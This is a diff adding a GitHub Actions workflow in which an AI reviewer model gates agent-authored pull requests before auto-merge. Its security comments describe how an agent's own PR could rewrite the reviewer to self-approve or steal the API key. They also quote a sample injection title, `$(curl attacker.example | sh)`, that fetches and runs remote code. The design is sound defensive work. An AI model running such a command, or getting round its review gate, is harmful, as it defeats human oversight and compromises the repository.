@@ -1,0 +1,232 @@
+name: Agent review
+
+# W13 / W10 follow-up: an AI reviewer looks at an `agent/*` PR's diff and CI
+# status and posts a verdict as a PR comment + a commit status/check named
+# `agent-review`. This is one of the two inputs agent-automerge.yml requires
+# (the other being CI itself); neither this nor auto-merge is a substitute
+# for GitHub branch protection, which this private/Free repo cannot enable
+# today (see docs/ops/AUTO_MERGE.md).
+#
+# SECURITY (fixed after hub review of the first version of this file):
+# 1. This job NEVER checks out the PR head. Only `main` (the default branch)
+#    is checked out, so `review_gate.py`/`cost_ledger.py` are always the
+#    trusted, reviewed copies on `main` -- never a version an agent's own PR
+#    could have modified to self-approve or exfiltrate OPENROUTER_AGENT_KEY.
+#    The diff itself is fetched read-only via `gh pr diff` (an API call, not
+#    a checkout) and sent to the reviewer model as inert text -- see
+#    review_gate.py's module docstring for the untrusted-diff framing.
+# 2. Every value that originates from the PR (title, body) or from a step
+#    output is passed through `env:` and referenced as "$VAR" in `run:`
+#    blocks, never interpolated directly via `${{ }}` into a shell string --
+#    a PR titled `$(curl attacker.example | sh)` must not run anything.
+# 3. PRs opened by agent-task.yml use the built-in `GITHUB_TOKEN`, and a
+#    GITHUB_TOKEN-authored PR does NOT trigger `pull_request` events (GitHub's
+#    anti-recursion rule -- see ci.yml's own comment on this). This workflow
+#    is therefore primarily triggered by `workflow_dispatch` with a
+#    `pr_number` input, called by agent-task.yml right after it opens a PR
+#    (the same pattern agent-task.yml already uses to dispatch ci.yml). There
+#    is deliberately no `pull_request` trigger: on that event GitHub runs the
+#    workflow file from the PR's own branch, with secrets, so a PR could
+#    rewrite this reviewer. workflow_dispatch always runs main's copy.
+
+on:
+  workflow_dispatch:
+    inputs:
+      pr_number:
+        description: "PR number to review"
+        required: true
+        type: string
+
+concurrency:
+  group: agent-review-${{ github.event.inputs.pr_number }}
+  cancel-in-progress: true
+
+permissions:
+  contents: read
+  pull-requests: write
+  statuses: write
+  actions: read
+
+env:
+  MAX_DIFF_BYTES: "60000"
+  CI_WAIT_TIMEOUT_SECS: "900"
+  PYTHON_VERSION: "3.13"
+
+jobs:
+  review:
+    name: Agent review
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    if: github.event_name == 'workflow_dispatch'
+    steps:
+      # Only `main` is ever checked out in this job -- see the module
+      # docstring above. review_gate.py/cost_ledger.py always run from here,
+      # never from the PR's own tree.
+      - name: Checkout default branch (trusted code only, never the PR head)
+        uses: actions/checkout@v7
+        with:
+          ref: ${{ github.event.repository.default_branch }}
+          persist-credentials: false
+
+      - name: Set up Python
+        uses: actions/setup-python@v7
+        with:
+          python-version: ${{ env.PYTHON_VERSION }}
+
+      - name: Resolve the PR to review
+        id: pr
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER_INPUT: ${{ github.event.inputs.pr_number || github.event.pull_request.number }}
+        run: |
+          set -euo pipefail
+          pr_json=$(gh pr view "$PR_NUMBER_INPUT" --json number,title,body,headRefName,headRefOid,baseRefOid,author,headRepositoryOwner)
+          {
+            echo "number=$(echo "$pr_json" | jq -r '.number')"
+            echo "branch=$(echo "$pr_json" | jq -r '.headRefName')"
+            echo "head_sha=$(echo "$pr_json" | jq -r '.headRefOid')"
+            echo "base_sha=$(echo "$pr_json" | jq -r '.baseRefOid')"
+            echo "author_login=$(echo "$pr_json" | jq -r '.author.login')"
+          } >> "$GITHUB_OUTPUT"
+          echo "$pr_json" | jq -r '.title' > "$RUNNER_TEMP/pr_title.txt"
+          echo "$pr_json" | jq -r '.body // ""' > "$RUNNER_TEMP/pr_body.txt"
+
+      - name: Fetch the diff (read-only, never checked out or executed)
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ steps.pr.outputs.number }}
+        run: |
+          set -euo pipefail
+          gh pr diff "$PR_NUMBER" > "$RUNNER_TEMP/pr.diff"
+          gh pr diff "$PR_NUMBER" --name-only > "$RUNNER_TEMP/changed_files.txt"
+          wc -c "$RUNNER_TEMP/pr.diff"
+
+      - name: Wait for CI conclusion on this commit
+        id: ci_status
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ steps.pr.outputs.head_sha }}
+        run: |
+          set -euo pipefail
+          deadline=$(( $(date +%s) + CI_WAIT_TIMEOUT_SECS ))
+          conclusion="unknown"
+          while [ "$(date +%s)" -lt "$deadline" ]; do
+            run_json=$(gh run list --workflow ci.yml --json headSha,status,conclusion \
+              --jq --arg sha "$HEAD_SHA" '[.[] | select(.headSha == $sha)] | sort_by(.databaseId) | last // empty')
+            if [ -n "$run_json" ]; then
+              status=$(echo "$run_json" | jq -r '.status')
+              if [ "$status" = "completed" ]; then
+                conclusion=$(echo "$run_json" | jq -r '.conclusion')
+                break
+              fi
+            fi
+            sleep 15
+          done
+          echo "conclusion=$conclusion" >> "$GITHUB_OUTPUT"
+          echo "CI conclusion for $HEAD_SHA: $conclusion"
+
+      - name: Run reviewer (fails closed if config or the call itself fails)
+        id: run_review
+        env:
+          AGENT_REVIEW_MODEL: ${{ vars.AGENT_REVIEW_MODEL }}
+          OPENROUTER_AGENT_KEY: ${{ secrets.OPENROUTER_AGENT_KEY }}
+          AGENT_DAILY_BUDGET_USD: ${{ vars.AGENT_DAILY_BUDGET_USD || '2' }}
+          CI_CONCLUSION: ${{ steps.ci_status.outputs.conclusion }}
+        run: |
+          set -euo pipefail
+          python3 output_apps/ecosystem_core/src/factory/review_gate.py \
+            --diff-file "$RUNNER_TEMP/pr.diff" \
+            --pr-title-file "$RUNNER_TEMP/pr_title.txt" \
+            --pr-body-file "$RUNNER_TEMP/pr_body.txt" \
+            --ci-status "$CI_CONCLUSION" \
+            --max-diff-bytes "$MAX_DIFF_BYTES" \
+            --out "$RUNNER_TEMP/review_result.json"
+
+      - name: Post PR comment
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR_NUMBER: ${{ steps.pr.outputs.number }}
+        run: |
+          set -euo pipefail
+          status=$(jq -r '.status' "$RUNNER_TEMP/review_result.json")
+          if [ "$status" = "skipped-budget" ]; then
+            message=$(jq -r '.message' "$RUNNER_TEMP/review_result.json")
+            body="<!-- agent-review-verdict -->
+          ### ⏭️ Agent review skipped: daily budget guard
+          ${message}"
+          else
+            body=$(jq -r '.comment_body' "$RUNNER_TEMP/review_result.json")
+          fi
+          echo "$body" > "$RUNNER_TEMP/comment_body.txt"
+          id=$(gh api "repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/comments" --paginate \
+            -q '.[] | select(.body | startswith("<!-- agent-review-verdict -->")) | .id' | head -1)
+          if [ -n "$id" ]; then
+            gh api -X PATCH "repos/$GITHUB_REPOSITORY/issues/comments/$id" -F body=@"$RUNNER_TEMP/comment_body.txt" > /dev/null
+          else
+            gh pr comment "$PR_NUMBER" --body-file "$RUNNER_TEMP/comment_body.txt"
+          fi
+
+      - name: Set the agent-review commit status
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ steps.pr.outputs.head_sha }}
+        run: |
+          set -euo pipefail
+          status=$(jq -r '.status' "$RUNNER_TEMP/review_result.json")
+          if [ "$status" = "skipped-budget" ]; then
+            state="pending"
+            desc="skipped: daily budget guard"
+          elif [ "$status" = "error" ]; then
+            state="failure"
+            desc="reviewer misconfigured, failed closed"
+          else
+            state=$(jq -r '.commit_status_state' "$RUNNER_TEMP/review_result.json")
+            verdict=$(jq -r '.verdict.verdict' "$RUNNER_TEMP/review_result.json")
+            risk=$(jq -r '.verdict.risk' "$RUNNER_TEMP/review_result.json")
+            desc="verdict=$verdict risk=$risk"
+          fi
+          gh api "repos/$GITHUB_REPOSITORY/statuses/$HEAD_SHA" \
+            -f state="$state" -f context="agent-review" -f description="$desc" > /dev/null
+
+      - name: Job summary (usage, no secret values)
+        run: |
+          {
+            echo "### Agent review usage"
+            echo '```json'
+            jq '.usage // {}' "$RUNNER_TEMP/review_result.json"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      - name: Append to cost ledger
+        if: always()
+        env:
+          PR_NUMBER: ${{ steps.pr.outputs.number }}
+        run: |
+          set -euo pipefail
+          mkdir -p "$RUNNER_TEMP/agent-ledger"
+          python3 - <<'PY'
+          import json
+          import os
+          import sys
+          from pathlib import Path
+
+          sys.path.insert(0, "output_apps/ecosystem_core/src/factory")
+          import cost_ledger
+
+          runner_temp = os.environ["RUNNER_TEMP"]
+          result_path = f"{runner_temp}/review_result.json"
+          ledger_path = f"{runner_temp}/agent-ledger/agent_review_ledger.jsonl"
+          with open(result_path, encoding="utf-8") as fh:
+              result = json.load(fh)
+          usage = result.get("usage") or {}
+          cost_ledger.append_row(
+              Path(ledger_path),
+              cost_ledger.SOURCE_AGENT_REVIEW,
+              {
+                  "pr": int(os.environ["PR_NUMBER"]),
+                  "status": result.get("status"),
+                  "model": usage.get("model"),
+                  "cost_usd": usage.get("cost_usd") or 0.0,
+              },
+          )
+          PY
